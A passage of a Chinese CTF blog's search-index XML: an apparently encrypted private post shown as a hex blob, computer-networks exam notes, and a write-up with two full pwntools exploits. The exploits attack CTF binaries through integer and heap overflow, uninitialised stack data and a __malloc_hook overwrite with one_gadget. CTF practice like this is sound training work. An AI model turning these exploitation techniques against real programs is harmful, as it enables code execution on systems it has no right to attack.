bb12bdbb6feca3f16ec64982fd0fd956d10bb203a1ca742b4dcd0f7eec5fdfa23edb5f8843cee5a7f28775002807171a8286bd52b97a6009c749d1fbfd9335d58787cd1dc1b7be276b6e944c6b18eb86fda6208f4c08dc0f190ef5eb4e5f3545fc45020a9fc6667dc4c1a2b7b2bf81a46ec5c82f80c7d2a173d3108d3f8fc780c6300b41e4bf02b022e33a6bd62969d2ac20cdfad3c8b21e0cf8911267686dead52900d2b047449779ec6ffa4f1c93412f761db8277cc4ce1a262586436375c117e159941404578be09e1df5f00c495528269074093dee9e9c580bb16de748c1407099313e4d1113b6dbbd7ca17f14a701f9ca3968379703b55662b1b04d4e869872d91c5155a00bdd23ca69adbb689ede8ea38ef91e3c7d0fb3879ce4f2792ed788129486039a59681aaac2691de7a22bcb9c132eda33c7ca7fb8a017f285b5d1f6e8c7852bfd2d3d88d0012b3178455f523a8fba7bb0dd09cea24d6b6f068eedf74aca2060eb3b6b6364dd53c643ac1c15033b819b0bda0f0e1042a73614d9bff6ba0b9aba9db7cc999340ba6120dc39129686f2e0f94f023191f673dffb6dcfddd6c177f85159306c58815c6a26eeef19127f5ce7c859141ee1dbfc3db0b0590b8fc4d242609f317fdf9e149046eea03de362f7b8349fcd63f70ecbf609ea25639d070d5bbd0c6986deaf9e47f6c03cef98fbe97876ceaf3c160d236bcfc746bafbdf8c537cc736633d8395b3f9fb7abca99f3e10e6f6880201f6dc5b464234c4612f929c556d0f823b4e692b187ee2ea3b7783c87477d6e57ccd684bc8d550d15a78509e481282d1cae7d250f7410aa0b3f61dad131a583f9b76ccda93b32dfa34985fd13ebed2a2bc9f7d879b80f0c8416a14c4012d8ce52d311be42a45db607f0a9e951f35e4a1bb81cbae8ac991c16a94b865b2c617c9e93edeea1ac7eb88fd9cd305220491d861426be59027e54a30d652d342ad5a495d2a9b40811713fe7a6b5edb4cbd87c1bf64dd1452279b5a6166023b103a608a5955cdccfe19a285c1b63a24372dbfc5612e25850bda311647ff8ee00df4fecbfd8c2354f597b2d99fba6f8467af79ed3ba806a78e6e7bcbbf709c037d86ad4a0a745009dfa8461b4eb397369294d80b0022305bbcfb663e0b43fb90b554087318b0ba11f177153d7898b914f910f8d92f78194dabc781a7f62697b23f38760d4e15cea0892e82a002fedaad7a9321d68dbc77c0d28f3ead121e99d21becbe6ad0a789b48bafb9a76e0c3888ae462d7ad349c6dc5ef3f9a2e2cbc4d0d81cb3204ac54d89492051513999250c8c01a2e7a42a202db2126884585e865583255268bf59ba61227e62fcdcad8985fdda7952ab58d07b1ba0b9b0eb51013d89a4b21b94aef8a59fe8c5bbfe9ade5556ec4fe7cf9e677c09180e872d3a11b35376f24734bf7aa12daa3ab696cb0fe95da4ccc374effc6964c5b0c780b420da9a3b41acec9a2fda0bd623ef4aa7e7aaa05fef1cae55c9ac0aeebedd495296af2eca9d7378ed4577f8b16d9fcf81d00e6102ce1e33dc9e9962a358b902f300b4dfb9f48ca00efe73bb1890e227ce8930b389752587137b2a7d69baaeecf2f855dd83282af64add07fdd9fa31a721190fe570060ef2ad5cfa4789049095f47f8a7a25a1dc0ff292493bd1e3937ea24ff3ef6049883576ec46866172ef71e17b57697fc209d3ab40fd3c15add233820b63ef8446f79f5c5bfdda9f6d40953a8ed093fecd339301e34552b660655bc8f4bf7bc980a452a4558264b0e5df6f198f7b99bf1a3d03e523649613afebaddd0d94809df2d5dc863dff67c4a909584ea9773b97f427f8e288b6727480273c0b1771da0a3c31d09f4b1fbc95f437305732ae482bfcd3655536c9f825476e8db0e06520c61f7b56604ccb1f19fe3d085add378335880634117f2a23d1a2c8f291e88db1a3fb94e9859309404259b15d50f9e4fffef47c925978d436f42ecf4c8564c3ce1557a5b7c9219287e76a8c9f227131538163a6fa2a8d807fbfc98980e800ad8b73e07ef75b3b25f9ea49bf2fe1db79d65b8a19e5af6a7dd5807324aa2a88571720db71d5ed1eaa304f188539d3c5960404726a390f5c9a37eea43af615fb13432a9f318f48c8a0dd3ffca4c079b04db1bcecdb03d3966554cafb0622fed8d15d9d531b9ee80d943a1ce855a5c68de1280d86b6bee40f7a2345007c2f991f6e64bb87d4b05e3369d604a93ba71a85044b274c2e06082b991ca598baa84605f3691e452a9a2e1d580ca83fd3500949154ced263a5f8310e79e2d3cce6744b60f64c45d2cb75a2c610efd9da020b7e0df69bc53ae88765a0da4d0ae9d421e47d65457bee5d7183a7c654d14e3437c505ce36c52831f4d19671fa4c806b239c1a73167b9981e66e91bf9ec2badf76df4f5bd786ba667bebd2cbca8740a620fc25fa930289a5a21c3d7e06dfcd012fcb35008b0daa55d4698e019e6679b220e0e84804644317606380986bd0e26c26471a4b9aa74e1da664f5ebb38b7df80342f0dffc70509f2f4c1cc40c882fb3140ebecc7668347dc8fd8eed7cf26d980e1a5c8b8227e84f79436d92d9b4c73929ed721ab250062776f0803e44c894c23d836acd55638c202802ab7a6f38d099636b986c84bf750bbadec656b540ea4bfba265e3bf87dc2c2fdcf42c8a523d61d15fcb127aba4a37a8425e846265257bf5692e24f747fa3e743077f44ef9cd222b5ec36f95dd9610d5db71716e51880aa68192e922b5d08a5af7eb1e57673dd6eab056f8c173882992d6bd1aed8c4650c7cb916654cf6954928c10468c592129862c3aea6c8d60f5a0080a1f30457d7ab9cb109e618743267460ae62ae65f1022f8e330f919125943a30330b63a022870ec23479ee4de87567eecf8bbe23c4e4fcdcb32b957365854750f2ce2c9ffb0de950610955a5dae31c2c77a420e38967ee60fdc0e55e9f1b46b7d6200bd76c983090d610e720bcbf30d4d920ee5ff8cbe5af6a1633172554bf158c859d27102594c2924d4b75fba56d18b0aa149089032f9e5d4ebbc0f10dad0358c3924290c6cb54ae7827581e4c6e59af23ce0e308b709c6c5db4531491d7dd944eb54abab7ca6d8940b93ef343a989d5c9c0857abf03282a19682720b870b9fbc6629fce543b6ee7bcf41992a61bc3007468bd4f3786aae252701b86f508d964e3c132321e7d8f293624ed29b754978a46086d4121d2781c058e478cb327ba93f229364c28611c67c90a549cb32d91457efafc510e2fba58ed28ea7d1f00441da354c272fdc4003ea7a028765ef6294308c9287295acda6bb98e795f1b9d083f81b921fd54b6b60207d57712a25505fff3c8abe2daffa5891ea7343d8a07b40ccffa8f0b1406c9a7df7c1d7d01a8421a127153cd0d2f84c929e3e8fac074b0e4f602dc3e63e9433bd7cec598dffa6804b51985a57099e69858d186513d400141aca2c05b30f7da14a1c27ad187a7a69fbc1d54bae2cc16686c6535259c9f3fb0b9ae67a96fe1ae9b86db5881b962837737d101ab11436fb9a635c94b5200a718def1f82455393dc1e720a5d266f1912dc51d38d8e7bdb06a3dd72be3e8ddaf29843ccbf912213a0914b10c0ab19548c24bd1fc6fef8f2ecbc6d41a375dd8b41002012f38575426c1a1658658460b2d536a55a529673aa404e211b4807f9041f59a736051a9ef2fd2ae5895e272f345d21476d0b7bdf1febbafb27cde4ecbbda7874ce5ee6a531340a08eaa01e89dcb8a6e5f0767eec287dc22e7b8e43ab8153b9619a7a66e89489660655b7362ea4a1102780a8b12558f0d092d5d4f004851ad3b368833d6b269d780f2a5ff726832fcc66cc455f5abdb78d12d999a34acb6bc1481731d1698c5beffb4525a81d01a48990e268703a3450a6b6d63ab1aa87cca02e28bf779bb91d8c1df72182462b188217d49e43b7b10249d49285dfb871bd97c768378efb974bb3a551815c55c5e7077e35efeb594b632a39903f2b33b813f3efa0d0573d1975b7fe05f88c6dba0471b3c7ca8ca7fed21ba01e172eda3c41084cad188fcca9143604f58f895f702b21773a0bc5b6f9aad9aa0b8c1ea2fc0c303e74a0cddea9f3560832aa172c15973cbe4fde269f1c2ab623a785bf6ee889d639f9d1ee9ed1b9fbc713f170f1f6ba4384994cf61e19e4b0e90446d863a9d4b764a5c60862d4f6872cbad733a67354796a59ecaacf50ea03a1671c75000e20177d151c703fdab1e46824756fe3837207e7f4bc83185d3514d0ddd053745fe95d5f583a842a01604638b78bae677be416af4c3c6a9d0ad66525d5b9230c8683028f0cbb2c5d55d2b24b87c3db12429a21daede54c683d2281169d1aa83543d053a6554b280410e4a0a626ffdaf83d0e8b23b23d50e211f26762894400b3e33e92f57cc8153254d566e19102b4cc1347abb46e603e45c2fa42d0da4f766bbb5630a4fc69ce9b6e865e9ab87007c90f8ad0b8d1a3fd5749f7e580d6dc6d6cc67e8f0b22441efbb134d172a5f0b2a5bda67cde3e7b2029938df1a97cc64e2ad514aa425386da6f063780a053a404800b2de4502e48b0c97be0bd2a768fbbc27478b61edd50cf9740bd262a1220e6ff08ac602540f2d9e8e93be759de94f7576a67b3e11da59b69bf5cf9b9efcbeddf20abd4912c45f8e066a6002ef3a2d693f392ed1b2eae283dd855dfbe841151270bec1d953f79c15a450644ceb0dec004a5a66597d9a03990b5e9274d34f52c848e6e2c977bafb0d9971349bfb2b7faa1238f83503f5a571fde997493061eb9108638c7c0165630e4fd6fbfd65e8f566b9c44f2ae44515dc4085fc5d8b20a11cb1c32c6170bc730a7157bb7bb1b56f1ce575288c2a72756bfc00d2000630af4df551df169698b7401d8c8236a2926cbf42d2d307bb42a5e69eec7e826695c05501571774f2d38f6a59430210f01ab142d509a548cdcd9ae406314563718e2b82821c4c4f9117b7e0a8e107291cbf0b4889af78a860d442f4c49f68e5b28dfff4441a352758e47be308b4365a013b9337c14e93f19fcff516a78939e649958c2e53ddf359ca0ca90d860577f8caa0d130f91ad4e2b655355b37761e6ffcea9cd3eec749564c1bed9afa014d2eafff79edd4dc7dd406382d3d29d1b1c54b4f50e0596a7e351cc03816a30fbf347bb02da2c0a9f5116754bf9e9a4363efebe49699428d92d75211f4e36440bd7337f265e40ea984b127818f23102b9320a6af63227153715d0f6d610de935222e31293d5c672afe6d6267770329e991a76d3d2babaead58c218a659057595215dfc5c605f80275426ec18e460a186036c70380dff1218a1f08e0397381e89620a4926ed20c522f0523dcaf18daf0ad6c531a59a89e16f6ae37e4bfc5a70f350c6c6061e989eab03cc4b279c5a1ae66ba4c7373ebe83c0527d954e868a123d6d10548de6133042b7c8b2f3168b91b697c0dcd2cea2ca1985730d65f7bad923b8f10f2eabdf8db9233cf6741215926f47455aee2b477fc68f9a1dd1b6297e682cc68ace166e762911d74f8cf16bf356a32e1ebb00050bf2399f2bb25486be6b09db8ff48fe0bc0a2c02792f9f779a8f80d8f1b0885ab37e8988a2f123b90aea1c1c95c63edb40aab5fb4b817ae4e0c531f1fe80d59ac0bfcdccf2e672197427129115824ad1f6a12f041c0ad7b9b7283df386ec86ed5e1c6ce6a96b3d4fc458058edbcc7bf043b47eb3d1ea9a5f2ea325fb255aeb6309dcfd5c1c397ca8d8609eea5fcf8ce807417ed9e9d718ab720a2f6e48e8fc16bb716f6bfc9e409beea05dce0ad789b53779b3b7bd28a01667d258109454485943caf1ccbd4fa738ff44490a3aec0e2ba25f602417ecb840d5014bfa5ec9fa277890a42843aa2411309d12d23c64a3fd0370634b8521a1555cd545fc6f82c20e5234e242a1e257a85b4d323230d6cd878fe21629d3a178a7aae4041ff0498326865c0ff45012ca92e6e62f6a3f0c95ab7f64ff5ef275c9b64e19687744ee1a0e9db3252095a9e5767dcccef3286d5a84aa4b8b2a7124f7e1fc37a32fca39a047dc8e2ef4c84e36dbf1351a509eb94d29fba8305d2e97d4753c8cf45e4d346192ad197c5fdf960e02d17e9167c9bf2acbedd1b525312547478da4cf2248e70108924333272d2023632a8385e72e33e1b9b1810ed8b4e6f058e4515913cee82573d49500ec6e538b5cd9be98ef488c4aa808d6abd44e1787d0ef4c2328e62dfa5cd300d5b04431f2d9c99e5b988bda6ee60fbf5aa0f71e82805e8c1dad7a11f578b697eb1b89508a9a3aca7e55844d6bca5508cbb95140c120fab3621b99d140cc8d36ee2b878f0ed8708af5b6e58f00bd3735a2761f902d98a1f00527c0183b23a946cc23b1cd380ec6f5d3bbed4f741f5987748c5f9d5c2e4a80eecadd0cd519974b5850e4717369e4868d666d2bf8751979a22761e53121040bb5e3a70773272746b15ff094b62f66caf9998e920ad87ddc2b00a758108e2d449928faeacfe2e570f912f6146ad61fbf4d5043d36b82c31ebb3d5bd1c560cada96414a64c4a18bb183ccec2a53f979c8552ae721045d98f46f51d47e3958d54132b98ce25e7d98cd348789221c6986b1377814c77f0c58a6a93af485c1e964d41ed0b0f9fe2a044e9d3d8497fef4c98bd9b174430e6c7464c96fb193cc8fb7fa5ce345a0802cabebd2934c9068e34d4fe4bc10c689c7e60b5ad86a25358c2efa005ece00350130996e94677c9669350aa581bad346a64f9961b5f9dccbf073edc230855809cd96627c2ac833a1264917d67f997b3562a9adc1edd818e9dbae6f8ede538007ede5581412c277caaf37b9cbe3ae20339b4335007aabf9157017d0ab5628b9d4955182c001e3f8f942338c5fbb00ee7913e7d8364e0727723e71a7698ca43ab41180c528ee448b98b0ab9f0187494bf70210873f718a28707c90eafa47000f351c46c9202ae19183035d764b759ed4fbc10eee8ef82f7fb27f2d9028ea70590bb3e1ea06f05a6cc7e6902e8e31b8ada20254caf2f2f79935b78864d108d9b0d417e2f96bfb198716e57509261fdea9ebb81ff126155864e5ea89703370544cc284a6a7005c799544c167ee25efe3667f6c402ced47940426de2850d5c296244f5ae055ea8c4aacca270e36454a6d8f07a076c01e03cd0b60831732fb8b49000dd6aea32289e7c45aef11378bd89825f6ab6c5c65c70c8ed31c4c99c246185aaba0ba933a384eb1d18377bf0899f5e69ae105f82cc34fb40c3fed2809611a27f1d9f88f059f19ad499d5a7cf9263a774b8af7611d2dbc93186aba30f8f58a510a87883d27df003e83e9032883124f4c46ef7c58687d0f13134dfe3301a8a8f7a1bdd90abcf01d40c84d2be47ba80fc0b7ec2fdc5f277895456f1da516428be980cd48eabe5c02dd9370c8d8939eb0034629bd67ed493abf8a2dafa5117dbfbb8edcf5531bba614b76c823a8d03e83c156deabb7a60069d95f695c0212a520f658d8e348436edcb1fac4a51428c60fed276ca03536758fc02d3a8b62be61e8feefd7547ff96492762c4fc09bc4051c2ea458dba7f55b03fd8d0d6b056610b8abc1c0ee58591b84802e11411fa28eadf6d936ff3f307ce8f19b14f38f96b77e6ea55588931234a594678182015ecd7d8c818c8030e0ba00282452a796ec4ed7892d3b2b726c3e82f28eca05418808017243be181f3147e3e3f12af878381031900d6598e50dc8c00db3a1956ef023b6525c6872d496400d67c0ac9501f3a88738ce89f78bc0c8c6987b62e80e33fa74dbeb59242401ad296dc2abee787f235073a099c7cfaf72003423fc80c8a5ec622960c65ad1c9e5040d3c7e955bb3d2d914166756ab2a1bb4b63f9aa0392bfc3e98e249601140fdb715fe5d2bd206e7286fc450d7323c648eb5d42bb452d189a6e50586f66c0348caf7e72505064c9ea6d4b472742934c41ba970ed5dbd1e38bee0c4881dc01a0bcc28b848a1d175d8bf3fd3c6b757cc5875c73fbcffe10a183d2ff90fe19173c4932b14445aaaabc301d1096f2abac2b791ab003f82977b355882640a7d1ec3f2ee980abce83c25313a4d37a34e677054b90437976044be55cf4582df526570ecb16ee7a7080474c9376c52adf3a2e8dd87bdbc82867880392c1c522a2ef8f95b7d6e8894e9a206cb2c405f90a1f2a047fd1ed77324985a6e783c5e6741a2e7eae390a16aad219543316a95f747bf19b9b8b855b555cf27e95bd5ffe8182c56ddc5d342b64f39f832c2dbe0fd167c4421d626f135af79b744135cc6f242a461e68ce649e457a840ca218a67a205c1524315cffc1e7a816c7e7d4f0f317b5b67ac34997caec0edf0a039d15ce58dcc9a82c2c3790d52db09edb5accc04066e4c34fab1cd1bb37b8c714038a2e3777d2127ce9b62f9d7e312acb166fe27c1df2ab5e351e489f1b95996af6b31885cbc69c054c12dc44aed3cedcf21a734199561b8b9ecf7ca4dc17e22cdd686d50efcf33ebdf061c433af9a97da3c5590b26d1eda9a121deb197a86e18ce02d32195cb533f8bb3aa9457496527943fff3df316728326452b93d3b13b7332fbd635b815be81c3ad3325f31ffc70638461c6e4617626158d14cac7b908b7a49f0c324309bc24512fcceec9b05afe677ec022004e0465ca50205b4ad54875a48f1b012ca441f853768dc161d8ab71f3cefb7e54c2ba1051d36f7eaa73f3166bcf3e33fd500cd30448ed7419889c8acccdb6831f5470d65614a5d6aab21e46955defe5202fe0382dd2351d0f49911a284335036ca345f177210943cb187c1a00a5015553f5a2b908afbc6bcf0db1dd46fb4aaa37da000bf995ccc9cfd36a926ec8baee05091c5bdd2d1946eeedeec84b830332e174a27fb7995d7661296078f25488539b100f813bb7c2a99e70b114a76158b5e2bf9f5067a38e5ba95f81760d4ef6320d54162d02e64eef30a7d09f750dcd362934db3220efb8c246729bfc020453cffbe85b8cf4df599066938807c6410f356e48bf2960047ab06450e7c5ebfc2c72eac76ea4a9a665d882f44f1e6b6602359132c0f3cc4ad04e9ceda934aece1f199a7b0021d8acb3eadd29a665a5a23f51cef1f2c45deec26fd8c6d4bc896286a53a308c356c3d84ee51137f3ae49755450a4988d30353acb2306d7bab151e4953372e0c7d6fbac825684b975485b23e9cc9818d8bab863890adad5d5b2bce486cc3239512db569db6d0b0bc8c77666fbf8669884d2dd57925b9441653f1a1c215342267ff3ad3463687398cc284bd0b885158ca287302c8ede12cd139a2d9ed4894c443cef969653df695a3e65ef9acac94f443b41db69a5e61ccf0e4b94ae6bf294c85199ba1eb2851d29bcd20b50346e0c97ff89ca7249b062dfbc3aca4682fb17715c471f8d09db61ddfd6710d1f2897ad7c4aebafeccca5b4e650ff585d1f44b1d352855360fa53ac3223a768c6c6f57f5f98476ac18251938dddb046a7c105baea2e0f23bd2540d83a2bdfb0df90a17b2fcc16c142d3267b2581db77bd3f5960ba5368827af6c13fce816a567bc3338478ce2b67a509454e820702d8ad6f9b445288d6c0f33a86fe4926de5b42d37c87083a799d9bb5660ae83c57aaf685633ac60bc634c4dc2f1a2daec1b5c68149a476d7af10ea788c04801452f6f8aae2f9197737395d8ea188081c08573259a8e5c0f159dc2d95baef9987c05981bd79e62b54456f60c49e98e17ada3d1ff0b780803eef64d38a40df75c78908984fb60c4fb7c5e4339bfdc48a5c294c95079c44f1b3f23b543a84e3c8de48afa8c7add5622d3f33d1bf889139ed874cdd367197de3ab6d125e3e4a0e44593c885619fc3bdb45f536cffe640b03bf129b8f754d90b1a745d2b54260118548605bd9c5c2057f812897d479a38478773bfc652fbc8895a8030b51c27c230db1ba7322a17e71197c4abab58186775c7b1d71a90e1a1ef505f1de7e034b6e8624678bf1ec185e88e9855dfbf785d63510c6fc8ee0f889b6e00472edb6356cb03f14db0ba961c67250abfc47200e87066951faf76a74b687ea6d6ffd21d53dfdc57491b5e61e0254014c85aa9fd56fc66078a519abb5d007f0422b8c8a3e7e1f1f6aec1ff042a189fb160340b8449967fd2871d9e0a02daaf8e99e377effc1a55028fd22dee7584b323fab7a549af4e56e79b1d7f535df8a7d18d123aff519c12569a4fdbb2dd94467acc69d3be936237b0a02471308bbdd9c01650fa7b1d419ccfeab6d9b48c2482476bc37700b18e2e23fff53a9468610ef6ddebc1dae499308c2a9279e0c1faef1a99b62bde767303f26358b1e9ef7099c5bdc50df010f58a8573398217f0213c77dec926f16582c1c117bb75c9762ebc858ed57654aa3ec474b6f233b8c9285a64cab40c94644cdd035e391ec488f3eeab694abe78b0d75c4a1fa3154c00c60c6973dcaf6ce95b60f1dad671bfb29dc8ef53e3da6c4d6a6a94d824231327683475b094c3b542ed469dc0f5dc6571c1c374a0ea4703cc8b9e35ca7ceb462f2d8b9c3e18881197aa7b5be39c3052f38bed05f35e83c92859431347e8432f065aa42a40f3e1c9481beba19b8ba2e5d04fbeac961fc07d8fa553fc3116585493063270f5fa5ffef5f7017ed0eb5105fde358ebce6cb4888496eb1b9ac9cdaf39cd50e5f27ccce334ac66a9309e79f15967950e2d78890933a6ca6cbc07a34b54326809a64b52c4ee770cb3d91c6cbd2a9e4c7ca8c3e7d1cf8b78c7337592ff3875d669aea9ad0d87c7c3efab6d33f130803d75cb8423683ae914e2e6720675e7ea1e3583ef0d7ee95dc8082a0699d0dbd99c71885ebbe7bc95e770a5b16a53645d9d6b973d7becd9a18e7233ab15b46449638a99001d7f84cad4316b6a7123f6730ee3b9ef57d4289b57d6b6deac07e9b5284ec65d339448d1624ba29cb1dd253f77d000642206c5825b640bd3b564b1ecf6e9fc969f8d4f3e506d9418826be4b4fee29b39741420689e4f5035abc6b19baed160f7ff543ebbb9da11e5de572404ca0c822171051e0fdf77338fd380d81b8b39c65f7e9fdcf40483c4292137209c3702b03cf0e2ec656e5736aae0a96c104c4f427b28d86e354290cd49f94c97f56b0796bd55f77f202e4d9c7d306cd2c09f450f1ac1e85960f99ad4878bc61a2b750b071db7834a45ad7956e47d25cfd3965cd90fa2aff14707417d38c46cc21d52973132db951de04ef1f6694f6000e409d49db31b7655737f1d640f90007ee8d1c3a3dbe18fdca9c293099f07be]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[计网期中复习]]></title>
    <url>%2F2019%2F11%2F21%2F%E8%AE%A1%E7%BD%91%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[前言：唉，失踪人口回归。。。好久没看/写博客了，已经荒草丛生了感觉orz，因为自从上了大二以来，课业压力剧增，无论是作业的复杂度还是数量都比大一时多了一倍，除了周末以外再也留不出整半天的时间了。。。想认真完成每一项作业还是很耗时间的，尤其是那些很恶心，又很费时间的大作业。。。再加上英语六级这个大麻烦，英语不好的人真的留下了泪（在B站看到一个小姐姐在德国用四种语言怼废青还是很解气的，也许真的碰到那种场合才会感慨为什么当初不好好学英语，如今却混到连六级都难过的地步。。。学渣叹气.jpg） 周末百分之八十的时间都拿去写作业和补课了，剩下的时间就想好好休息一下或者看个电影啥的，因为十月份去了三次线下，课业拉下的太多，CTF的很多东西真的没时间弄了，很多想研究的东西只能在假期搞了QAQ。。。因为很久没看了，也很久没做题了，感觉已经被队里同期的师傅们甩下一大截了，在被开的边缘疯狂试探。。。 苍天啊，杀千刀的实验班qwq，逆向，Web，密码三管齐下，全tm是我不会的，学起来挺吃力的orz，不过到大三应该会好很多了吧，因为已经积累了很多知识了。。。。 因为最近很烦，又摊上计网期中，就拿计网复习笔记来水一篇博客吧。。。QAQ 盗用23R3F师傅的图233来表达我此刻的心情： 第一章，概述：计算不同分组交换方法的时延时需要注意，画图理解可靠性更高。 时延 = 发送时延/传输时延 + 传播时延 + 排队时延 + 处理时延。 分组交换，报文交换，电路交换三者的比较。 网络性能：带宽（网络可通过的最高数据率），时延，吞吐量（信道上的数据平均传输速率，硬件的吞吐量就是带宽，带宽代表网络吞吐量的上限），丢包率。 OSI七层模型，TCP/IP五层模型 第二章，应用层：C/S vs P2P HTTP：80请求报文和响应报文的结构 HTTP1.0 和 HTTP1.1 对比 Cookies SMTP：25 &amp;&amp; POP3：110不造要考啥。。。。。 DNS：53报文结构？？不造要考啥、。。 FTP：21不造要考啥。。。 Telnet：23SSH：22第三章，传输层：概述：可靠数据的传输应有四个特点： 数据应在传输过程中不会改变。 数据在传输过程中不会丢失。（丢失的原因：1.网络或信道的不可靠而导致接收方无法接到数据。 2.接收方处理速率远低于发送速率，接收方的缓冲区溢出，导致新收到的数据包被丢弃。3.网络拥塞，路由器的缓冲区溢出，丢弃溢出的数据包。4.包数据发生错误而被接收方丢弃） 数据不会重复。 数据不会失序。 出现差错： 发送端重发。===&gt; 自动重传请求（ARQ机制） 接收端直接纠错。===&gt; 差错校验（校验和，循环冗余码） 丢失情况： 发送方发送的数据包丢失。 接收方发送的反馈包丢失。 ARQ协议版本演化：v2.0–最基础的确认应答协议 v2.1—超时重传协议，解决发送包的丢失 v2.2—序号机制，解决ACK丢失与ACK延误 v3.0—停止-等待ARQ：未有序号概念，只是用0和1来代表相邻的两个消息。 v4.0—Go-Back-N/连续 ARQ协议：引入滑动窗口的概念，n位发送序号 ==&gt; [0~(2^n)-1] ，需注意序号相同的两个包不相同的情况，接收方窗口长度为1，存在回退的缺点。TCP基于连续ARQ协议 v5.0—选择重传ARQ：接收方窗口长度不再为1，接受窗口长度+发送窗口长度&lt;=2^n &amp;&amp; 发送窗口长度&gt;=接受窗口长度，解决了回退的缺点，但是接收方需要设定缓冲区。 UDP:特点： 不面向连接且不可靠 自身不带有顺序控制 自身不带有重发控制 自身不带有流量控制 自身不带有拥塞控制 实时性好，时延低，追求交互性的应用多使用UDP 面向消息报文流 TCP:以下所有的可靠的意义请参见第三章概述的第一点。 特点： 面向连接且可靠 顺序控制 重发控制 流量控制 拥塞控制 面向字节流 为确保可靠所设计的机制： 序列号与确认应答（确保消息不会失序和完整） 重发超时（随重发次数的递增，重发时间间隔以指数递增） 连接管理：三次握手，四次挥手 滑动窗口 MSS 窗口控制与拥塞控制（收到三次ACK后快速重传） 流量控制 Nagle策略（发送方的报文尽可能的长） 延迟确认应答（接收方的缓冲区尽可能的大） 捎带应答（接收方给发送方发了一个消息，这个消息等于原本想发送的消息加上确认收到了发送方的上个消息的确认信息。），需要注意的是，这时接收方的传输时延不再可忽略，而是和发送方发消息同等看待，计算题吞吐量和信道利用率时需注意。 TCP/UDP和应用层协议的关系： TCP UDP FTP 文件传输协议 Telnet 远程登录窗口 SMTP 邮件传输协议 POP3 邮件访问协议：邮件的下载和删除等 HTTP 从web服务器传输超文本到本地浏览器 DNS 将域名解析为邮件 SNMP 管理网络设备，由于设备多，所以用UDP TFTP 简单文件传输协议 自己画一个完整的图加深对TCP的理解。]]></content>
      <categories>
        <category>课内课程</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[两道有趣的题目]]></title>
    <url>%2F2019%2F09%2F17%2F%E4%B8%A4%E9%81%93%E6%9C%89%E8%B6%A3%E7%9A%84%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[前言：两道题的漏洞都是第一次见，可以理解为栈中的UAF，比较有趣，在这里记录一下。 pwn1:这题据广大的大佬说是2019Xman的最后一题，还是出的挺有新意的。 漏洞点：整数溢出+堆溢出+栈中UAF(leak) exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(count): p.recvuntil('choice:') p.send('2') p.recvuntil('buy:') p.send('1') p.recvuntil('buy:') p.send(str(count))p.recvuntil('choice:')p.send('\x11'*0x8)p.recvuntil('\x11'*0x8)pro_base = u64(p.recv(6).ljust(8,'\x00')) - 0x8f0 log.success('pro_base = '+hex(pro_base))new(12558384)new(12558384)new(1)p.recvuntil('choice:')p.send('3')new(2)new(22)new(12558384)new(12558384)p.recvuntil('choice:')p.send('3')p.recvuntil('(y/n)\n')p.sendline('y')p.recvuntil('poor:')payload = p64(0)*3+p64(0x31)+p64(0)*2+p64(pro_base+0x204020)p.send(payload)p.recvuntil('choice:')p.send('3')p.recvuntil('2. Name: ')flag = p.recvuntil('.',drop = True)log.success('flag = '+flag)if attach == 1: gdb.attach(p)p.interactive() pwn2:据Ama2in9大佬说是国赛东北半决赛的最后一题，漏洞也比较有意思。 漏洞点：A，B两个函数共用一个栈环境，A函数残留的脏数据，会赋值给B函数中未初始化的变量。 可以理解为未初始化变量漏洞？我觉得也可以理解为栈中的UAF(修改变量)。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(passwd,size,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('passwd:') p.send(passwd) p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('Content:') p.send(content)def show(): p.recvuntil('&gt;&gt; ') p.sendline('1')def delete(passwd,index): p.recvuntil('&gt;&gt; ') p.sendline('4') p.recvuntil('passwd:') p.send(passwd) p.recvuntil('index:') p.sendline(str(index))def edit(passwd,index,content): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('passwd:') p.send(passwd) p.recvuntil('index:') p.sendline(str(index)) p.recvuntil('Content:') p.send(content)new('\x00'*0x28,0x460,'\x00'*0x460) #0new('\x00'*0x28,0x60,'\x00'*0x60) #1delete('\x00'*0x28,0)new('\x00'*0x28,0x60,'\n') #0show()p.recvuntil(': ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f1aa15faf78-0x7f1aa1236000)log.success('libcbase = '+hex(libcbase))edit('\x00'*0x28,0,'\x11'*0x10+'\n')show()p.recvuntil('\x11'*0x10)heap_addr = u64(p.recv(6).ljust(8,'\x00')) - 0xb0log.success('heap_addr = '+hex(heap_addr))delete('\x00'*0x28,0)delete('\x00'*0x28,1)delete('\x00'*0x20+p64(heap_addr+0xc0),10)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]new('\x00'*0x28,0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23)+'\n') #0new('\x00'*0x28,0x60,'\n') #1new('\x00'*0x28,0x60,'\n') #2new('\x00'*0x28,0x60,'\x00'*0x13+p64(libcbase+one_gadget[2])+'\n') #3delete('\x00'*0x28,3)if attach == 1: gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019ByteCTF / 2019OGeek / 2019SuCTF 大杂烩]]></title>
